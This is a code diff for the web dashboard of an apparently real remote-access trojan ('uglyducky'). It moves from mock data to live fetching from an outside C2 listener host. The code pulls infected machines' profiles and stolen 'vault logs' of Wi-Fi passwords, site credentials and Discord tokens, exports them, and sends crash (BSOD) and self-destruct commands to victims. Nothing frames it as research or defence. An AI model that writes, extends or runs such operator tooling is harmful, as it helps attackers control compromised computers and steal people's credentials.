@@ -2,44 +2,108 @@
 // ==================================================================
 // --- CONFIGURATION ---
 // ==================================================================
-// All traffic (commands and data fetching) routes through your Render Hub.
-// NO API KEYS ARE STORED HERE.
 const C2_LISTENER_URL = "https://uglyducky-c2-listener.onrender.com"; 
 // ==================================================================
 
 // --- GLOBAL STATE ---
-let activeNodeId = "DESKTOP-Q1A2Z"; // Default target
-let globalData = []; // To store fetched logs for exporting
-
-// --- MOCK DATA FOR C2 DASHBOARD ---
-const mockNodes = [
-    { id: 'DESKTOP-Q1A2Z', os: 'Windows 11', ip: '192.168.1.44', lat: 40.71, lng: -74.00, status: 'green' }, // NY
-    { id: 'MACBOOK-PRO-99', os: 'macOS 13', ip: '10.0.0.12', lat: 51.50, lng: -0.12, status: 'red' },      // London
-    { id: 'UBUNTU-SERV-01', os: 'Linux 20.04', ip: '172.16.0.5', lat: 35.67, lng: 139.65, status: 'yellow' }, // Tokyo
-    { id: 'LAPTOP-WORK', os: 'Windows 10', ip: '192.168.0.100', lat: -33.86, lng: 151.20, status: 'green' }  // Sydney
-];
+let activeNodeId = null; 
+let globalData = [];
+let allNodes = []; 
 
 // ==========================================
 // INITIALIZATION
 // ==========================================
 document.addEventListener("DOMContentLoaded", () => {
-    switchTab('rat'); // Set initial tab
-    initDragAndDrop(); // Init Window Manager
-    initResizers(); // Init Gutters
-    renderNodesList(); // Render Left Panel
-    renderMap(); // Render Geo Map
-    selectNode(activeNodeId); // Set initial active node in UI
+    switchTab('extraction'); // Lock user to extraction page on load
+    initDragAndDrop();
+    initResizers();
+    renderNodesList(); // Will show "Authenticate to begin"
+    renderMap();
 });
 
+// ==========================================
+// AUTHENTICATION & FETCHING
+// ==========================================
+document.getElementById("deviceId").addEventListener("keypress", function(e) {
+    if (e.key === "Enter") { e.preventDefault(); fetchData(); }
+});
+
+async function fetchData() {
+    const deviceId = document.getElementById('deviceId').value.trim();
+    if (!deviceId) return showToast("Target Identifier missing.", "error");
+
+    const statusMsg = document.getElementById('statusMsg');
+    const btn = document.getElementById('connectBtn');
+    
+    // Reset UI state
+    allNodes = [];
+    globalData = [];
+    activeNodeId = null;
+    document.getElementById('output').innerHTML = "";
+    document.getElementById('filterContainer').classList.add('hidden');
+    document.getElementById('exportBtn').classList.add('hidden');
+    renderNodesList();
+    renderMap();
+
+    statusMsg.classList.remove('hidden');
+    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Authenticating & fetching node data...';
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
+
+    try {
+        // --- STEP 1: Fetch Node Profile ---
+        const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`);
+        if (nodeResponse.status === 404) {
+            throw new Error(`Device ID '${deviceId}' not found.`);
+        }
+        if (!nodeResponse.ok) {
+            throw new Error("API Error fetching node details.");
+        }
+        const nodeData = await nodeResponse.json();
+        
+        // --- STEP 2: Update UI with Authenticated Node ---
+        activeNodeId = nodeData.id;
+        allNodes = [nodeData]; 
+        renderNodesList();
+        renderMap();
+        selectNode(activeNodeId); 
+
+        // --- STEP 3: Fetch Vault Logs ---
+        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
+        const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`);
+        if (!logsResponse.ok) throw new Error("API Error fetching vault logs.");
+        
+        const logsData = await logsResponse.json();
+        globalData = logsData;
+
+        if (globalData.length === 0) {
+            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>Node found, but no vault logs available.`;
+            showToast("Node is active but has no vault data.", "error");
+        } else {
+            statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
+            document.getElementById('exportBtn').classList.remove('hidden');
+            buildFilters();
+            renderCards(globalData, document.getElementById('output'));
+            showToast("Authentication successful! Data loaded.", "success");
+            
+            // Switch directly to C2 view after brief delay
+            setTimeout(() => switchTab('rat'), 1000); 
+        }
+
+    } catch (error) {
+        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
+        showToast(error.message, "error");
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole"></i> Decrypt';
+    }
+}
 
 // ==========================================
-// C2 COMMAND FUNCTIONS (Sending to Render)
+// C2 COMMAND FUNCTIONS
 // ==========================================
 async function sendCommandToNode(deviceId, command) {
-    if (!deviceId) {
-        showToast("No active node selected!", "error");
-        return;
-    }
+    if (!deviceId) return showToast("No active node selected!", "error");
     
     termLog(`Sending command '${command}' to ${deviceId}...`);
     try {
@@ -54,40 +118,32 @@ async function sendCommandToNode(deviceId, command) {
             throw new Error(`Server responded with ${response.status}`);
         }
     } catch (error) {
-        showToast(`Failed to send command. (Is Render Server online?)`, "error");
+        showToast(`Failed to send command.`, "error");
         termLog(`[ERROR] Failed to send command: ${error.message}`);
     }
 }
 
 window.triggerScorchedEarth = function() {
-    const confirmation = prompt(`WARNING: SCORCHED EARTH PROTOCOL.\nThis will permanently remove the payload and all logs from ${activeNodeId}.\n\nType 'BURN' to confirm.`);
-    if (confirmation === "BURN") {
-        sendCommandToNode(activeNodeId, "SELF_DESTRUCT");
-    } else {
-        showToast("Self-destruct aborted.", "error");
-    }
+    if (!activeNodeId) return showToast("No active node.", "error");
+    const confirmation = prompt(`WARNING: SCORCHED EARTH PROTOCOL.\nThis will permanently remove the payload from ${activeNodeId}.\n\nType 'BURN' to confirm.`);
+    if (confirmation === "BURN") { sendCommandToNode(activeNodeId, "SELF_DESTRUCT"); } 
+    else { showToast("Self-destruct aborted.", "error"); }
 };
 
 window.triggerBSOD = function() {
-    if (confirm(`This will force a Blue Screen of Death (BSOD) on ${activeNodeId}. The target system will immediately crash.\n\nAre you sure you want to continue?`)) {
+    if (!activeNodeId) return showToast("No active node.", "error");
+    if (confirm(`This will force a Blue Screen of Death (BSOD) on ${activeNodeId}. The target system will immediately crash.\n\nAre you sure?`)) {
         sendCommandToNode(activeNodeId, "BSOD");
-    } else {
-        showToast("BSOD command aborted.", "error");
-    }
+    } else { showToast("BSOD command aborted.", "error"); }
 };
-
 
 // ==========================================
 // UI & TAB LOGIC
 // ==========================================
 window.switchTab = function(tabId) {
     document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-    
-    // Reset buttons
     document.getElementById('tab-extraction').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
     document.getElementById('tab-rat').className = "px-6 py-1.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white hover:bg-white/5";
-    
-    // Activate target
     document.getElementById('view-' + tabId).classList.add('active');
     const activeColor = tabId === 'extraction' ? 'bg-cyberBlue text-dark shadow-[0_0_15px_rgba(0,210,211,0.3)]' : 'bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]';
     document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;
@@ -98,14 +154,9 @@ window.showToast = function(msg, type="success") {
     const icon = document.getElementById('toastIcon');
     document.getElementById('toastMsg').innerText = msg;
     
-    if(type === "error") {
-        toast.classList.replace('border-neon', 'border-red-500');
-        icon.className = "fa-solid fa-triangle-exclamation text-red-500";
-    } else {
-        toast.classList.replace('border-red-500', 'border-neon');
-        icon.className = "fa-solid fa-circle-check text-neon";
-    }
-
+    toast.classList.replace(type === "error" ? 'border-neon' : 'border-red-500', type === "error" ? 'border-red-500' : 'border-neon');
+    icon.className = type === "error" ? "fa-solid fa-triangle-exclamation text-red-500" : "fa-solid fa-circle-check text-neon";
+    
     toast.classList.replace('translate-y-24', 'translate-y-0');
     toast.classList.replace('opacity-0', 'opacity-100');
     setTimeout(() => {
@@ -115,12 +166,10 @@ window.showToast = function(msg, type="success") {
 };
 
 // ==========================================
-// TILING WINDOW MANAGER (Drag & Drop)
+// TILING WINDOW MANAGER
 // ==========================================
 let draggedPanel = null;
-
 function initDragAndDrop() {
-    // Unbind old events
     document.querySelectorAll('.draggable-header').forEach(header => {
         const newHeader = header.cloneNode(true);
         header.parentNode.replaceChild(newHeader, header);
@@ -130,13 +179,12 @@ function initDragAndDrop() {
         slot.parentNode.replaceChild(newSlot, slot);
     });
 
-    // Rebind headers
     document.querySelectorAll('.draggable-header').forEach(header => {
         header.addEventListener('dragstart', (e) => {
             if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized')) { e.preventDefault(); return; }
             draggedPanel = header.closest('.drag-panel');
             e.dataTransfer.effectAllowed = 'move';
-            e.dataTransfer.setData('text/plain', ''); // Firefox fix
+            e.dataTransfer.setData('text/plain', '');
             setTimeout(() => draggedPanel.classList.add('dragging'), 0);
         });
         header.addEventListener('dragend', () => {
@@ -146,7 +194,6 @@ function initDragAndDrop() {
         });
     });
 
-    // Rebind slots
     document.querySelectorAll('.drag-slot').forEach(slot => {
         slot.addEventListener('dragover', (e) => {
             e.preventDefault(); 
@@ -170,9 +217,6 @@ function initDragAndDrop() {
     });
 }
 
-// ==========================================
-// TILING WINDOW MANAGER (Resizers)
-// ==========================================
 function initResizers() {
     setupResizer('rz-v1', 'col-left', 'col-mid', true);
     setupResizer('rz-v2', 'col-mid', 'col-right', true);
@@ -210,7 +254,6 @@ function setupResizer(resizerId, prevId, nextId, isVertical) {
             document.removeEventListener('mousemove', onMouseMove);
             document.removeEventListener('mouseup', onMouseUp);
         };
-
         document.addEventListener('mousemove', onMouseMove);
         document.addEventListener('mouseup', onMouseUp);
     });
@@ -261,26 +304,26 @@ window.resetLayout = function() {
 };
 
 // ==========================================
-// GEO THREAT MAP & NODES LIST
+// RENDER & SELECTION LOGIC
 // ==========================================
 function renderNodesList() {
     const container = document.getElementById('nodes-list');
     if(!container) return;
     container.innerHTML = '';
+    
+    if (allNodes.length === 0) {
+        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate with a Target ID to begin.</p>`;
+        return;
+    }
 
-    mockNodes.forEach(node => {
+    allNodes.forEach(node => {
         let dotColor = node.status === 'green' ? 'bg-green-500' : (node.status === 'red' ? 'bg-red-500' : 'bg-yellow-500');
-        let isClickable = node.status !== 'red';
-        let containerClasses = isClickable 
-            ? 'cursor-pointer hover:bg-white/5 border-gray-800' 
-            : 'opacity-60 cursor-not-allowed';
-        let activeBorder = node.id === activeNodeId && isClickable ? 'border border-neon bg-neon/5' : 'border border-gray-800 bg-[#050810]';
-        let activeLine = node.id === activeNodeId && isClickable ? '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>' : '';
+        let activeBorder = 'border border-neon bg-neon/5'; 
+        let activeLine = '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>';
         let pulse = node.status === 'green' ? 'animate-pulse' : '';
-        let clickAction = isClickable ? `onclick="selectNode('${node.id}')"` : '';
 
         container.innerHTML += `
-            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all ${containerClasses}" ${clickAction}>
+            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all">
                 ${activeLine}
                 <div class="flex justify-between items-start mb-2 pl-2">
                     <div class="flex items-center gap-2">
@@ -289,8 +332,7 @@ function renderNodesList() {
                     </div>
                     <span class="w-2.5 h-2.5 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
                 </div>
-            </div>
-        `;
+            </div>`;
     });
 }
 
@@ -298,15 +340,11 @@ function renderMap() {
     const mapDots = document.getElementById('map-dots');
     if(!mapDots) return;
     mapDots.innerHTML = '';
-
-    mockNodes.forEach(node => {
-        // Convert Lat/Lng to percentages for the visual CSS map.
+    
+    allNodes.forEach(node => {
         const x = ((node.lng + 180) / 360) * 100;
-        let y = ((90 - node.lat) / 180) * 100;
-        y = y * 0.9 + 5; 
-
+        let y = ((90 - node.lat) / 180) * 100 * 0.9 + 5;
         let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
-
         mapDots.innerHTML += `
             <div class="map-dot ${dotColor}" style="left: ${x}%; top: ${y}%;">
                 <div class="map-tooltip text-[10px] text-left">
@@ -315,19 +353,14 @@ function renderMap() {
                     <div class="text-gray-400">OS: <span class="text-white">${node.os}</span></div>
                     <div class="text-gray-400">STAT: <span class="${dotColor}">${node.status.toUpperCase()}</span></div>
                 </div>
-            </div>
-        `;
+            </div>`;
     });
 }
 
 window.selectNode = function(nodeId) {
-    activeNodeId = nodeId;
-    termLog(`Selected node: ${nodeId}`);
-    
-    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP`;
+    termLog(`Session established. Authenticated as: ${nodeId}`);
+    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP proxy`;
     document.getElementById('fs-active-node').innerText = nodeId;
-
-    renderNodesList();
 };
 
 // ==========================================
@@ -339,7 +372,7 @@ window.termLog = function(msg) {
     term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', '');
     const line = document.createElement('div'); line.className = "text-gray-300 mt-1"; line.innerText = `[*] ${msg}`;
     term.appendChild(line);
-    const prompt = document.createElement('div'); prompt.className = "mt-2 text-green-400"; prompt.innerHTML = `C:\\Users\\John> <span class="cursor-blink"></span>`;
+    const prompt = document.createElement('div'); prompt.className = "mt-2 text-green-400"; prompt.innerHTML = `C:\\Users\\System> <span class="cursor-blink"></span>`;
     term.appendChild(prompt);
     term.scrollTop = term.scrollHeight;
 };
@@ -349,10 +382,14 @@ window.executeTermCommand = function(inputEl) {
     if(!val) return;
     const term = document.getElementById('terminal-output');
     term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', val);
+    
     setTimeout(() => {
-        if(val.toLowerCase() === 'clear') { term.innerHTML = `<div class="text-green-400">C:\\Users\\John> <span class="cursor-blink"></span></div>`; inputEl.value = ''; return; }
+        if(val.toLowerCase() === 'clear') { 
+            term.innerHTML = `<div class="text-green-400">C:\\Users\\System> <span class="cursor-blink"></span></div>`; 
+            inputEl.value = ''; 
+            return; 
+        }
         
-        // Route known commands to Render
         if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
             termLog(`Forwarding command to C2 server...`);
             if (val.toUpperCase() === 'BURN') {
@@ -361,37 +398,32 @@ window.executeTermCommand = function(inputEl) {
                 sendCommandToNode(activeNodeId, "BSOD");
             }
         } else {
-            termLog(`'${val}' executed locally (MOCK).`);
+            termLog(`'${val}' queued. (Note: standard terminal emulation in development)`);
         }
     }, 200);
     inputEl.value = '';
 };
 
 // ==========================================
-// FILE EXPLORER MOCK
+// FILE EXPLORER
 // ==========================================
 window.openFileSystem = function() {
+    if(!activeNodeId) return showToast("Must authenticate to node first.", "error");
     const modal = document.getElementById('fileExplorerModal');
     modal.classList.remove('hidden');
     setTimeout(() => modal.classList.add('visible'), 10);
     
     const tbody = document.getElementById('fsTbody');
     tbody.innerHTML = `
-        <tr class="border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer" onclick="termLog('Navigating to Documents...')">
-            <td class="p-3 text-center"><i class="fa-solid fa-folder text-yellow-500"></i></td>
-            <td class="p-3 font-bold text-white">Documents</td>
+        <tr class="border-b border-gray-800/60 hover:bg-neon/10 transition-colors">
+            <td class="p-3 text-center"><i class="fa-solid fa-triangle-exclamation text-yellow-500"></i></td>
+            <td class="p-3 font-bold text-gray-300">File System Offline</td>
             <td class="p-3 text-right text-gray-400"></td>
-            <td class="p-3 text-right text-gray-500 text-xs">2023-10-25</td>
+            <td class="p-3 text-right text-gray-500 text-xs"></td>
             <td class="p-3 text-center"></td>
         </tr>
-        <tr class="border-b border-gray-800/60 hover:bg-neon/10 transition-colors">
-            <td class="p-3 text-center"><i class="fa-solid fa-file-lines text-gray-400"></i></td>
-            <td class="p-3 font-bold text-gray-300">passwords.txt</td>
-            <td class="p-3 text-right text-gray-400">2.4 KB</td>
-            <td class="p-3 text-right text-gray-500 text-xs">2023-01-15</td>
-            <td class="p-3 text-center"><i class="fa-solid fa-download text-gray-500 hover:text-cyberBlue cursor-pointer" onclick="showToast('Downloaded passwords.txt')"></i></td>
-        </tr>
     `;
+    termLog("File Explorer initialized. Awaiting directory listing capability.");
 };
 
 window.closeFileSystem = function() {
@@ -399,72 +431,13 @@ window.closeFileSystem = function() {
     modal.classList.remove('visible');
     setTimeout(() => modal.classList.add('hidden'), 300);
 };
-window.navigateUp = function() { showToast('Already at root C:\\'); };
+window.navigateUp = function() { showToast('Awaiting live target connection.'); };
 window.triggerUpload = function() { document.getElementById('fileUploadInput').click(); };
-document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.files[0]) showToast(`Uploaded ${e.target.files[0].name}`); };
+document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.files[0]) showToast(`Upload queued: ${e.target.files[0].name}`); };
 
 // ==========================================
-// DATA EXTRACTION (Proxied via Render)
+// VAULT CARD RENDERING
 // ==========================================
-document.getElementById("deviceId").addEventListener("keypress", function(e) {
-    if (e.key === "Enter") { e.preventDefault(); fetchData(); }
-});
-
-window.fetchData = async function() {
-    const deviceId = document.getElementById('deviceId').value.trim();
-    const outputDiv = document.getElementById('output');
-    const statusMsg = document.getElementById('statusMsg');
-    const btn = document.getElementById('connectBtn');
-    const exportBtn = document.getElementById('exportBtn');
-    const filterContainer = document.getElementById('filterContainer');
-    
-    if (!deviceId) return showToast("Target Identifier missing.", "error");
-
-    statusMsg.classList.remove('hidden');
-    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Fetching vault nodes securely via C2...';
-    btn.disabled = true;
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
-    outputDiv.innerHTML = "";
-    filterContainer.classList.add('hidden');
-    exportBtn.classList.add('hidden');
-
-    try {
-        // Fetching through the secure proxy endpoints!
-        const response = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
-            method: 'GET'
-        });
-
-        if (!response.ok) throw new Error("API Proxy Error");
-        const data = await response.json();
-
-        if (data.length === 0) {
-            throw new Error("Empty Array");
-        } else {
-            globalData = data;
-            statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
-            exportBtn.classList.remove('hidden');
-            buildFilters();
-            renderCards(globalData, outputDiv);
-            showToast("Vault Extracted Successfully");
-        }
-    } catch (error) {
-        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>API Failed or Empty. Injecting mock objects for UI testing...`;
-        globalData = [
-            { category: 'Wi-Fi Networks', created_at: new Date().toISOString(), content: "SSID: Home_Network_5G\nPASS: supersecret123\n----------\nSSID: Starbucks_Guest\nPASS: \n" },
-            { category: 'Passwords', created_at: new Date().toISOString(), content: "URL: https://github.com/login\nUSER: hacker_dude\nPASS: password1234\n----------\nURL: netflix.com\nUSER: admin@email.com\nPASS: letmein99\n" },
-            { category: 'System Info', created_at: new Date().toISOString(), content: "OS: Windows 11 Pro\nCPU: Intel Core i7-10700K\nRAM: 32 GB\nGPU: NVIDIA RTX 3080\nIP: 192.168.1.44" },
-            { category: 'Discord Tokens', created_at: new Date().toISOString(), content: "SOURCE: Discord PTB\nTOKEN: mfa.1234567890abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ" }
-        ];
-        exportBtn.classList.remove('hidden');
-        buildFilters();
-        renderCards(globalData, outputDiv);
-        showToast("Mock Data Loaded", "success");
-    } finally {
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole"></i> Decrypt';
-    }
-};
-
 function buildFilters() {
     const container = document.getElementById('filterContainer');
     container.innerHTML = '';
@@ -532,7 +505,7 @@ function renderCards(data, outputDiv) {
         `;
         outputDiv.appendChild(slot);
     });
-    initDragAndDrop(); // Re-bind drag/drop for vault slots
+    initDragAndDrop(); 
 }
 
 function parseToHTML(category, content) {
@@ -585,20 +558,17 @@ window.copyData = function(btnElement) {
 };
 
 window.exportLogs = function() {
-    if (globalData.length === 0) {
-        showToast("No data to export.", "error");
-        return;
-    }
+    if (globalData.length === 0) return showToast("No data to export.", "error");
     const deviceId = document.getElementById('deviceId').value.trim() || 'export';
     const jsonData = JSON.stringify(globalData, null, 2);
     const blob = new Blob([jsonData], { type: 'application/json' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `uglyducky-logs-${deviceId}.json`;
+    a.download = `ducky_logs_${deviceId}.json`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
-    showToast("Logs exported as JSON file.");
+    showToast("Logs exported.");
 };
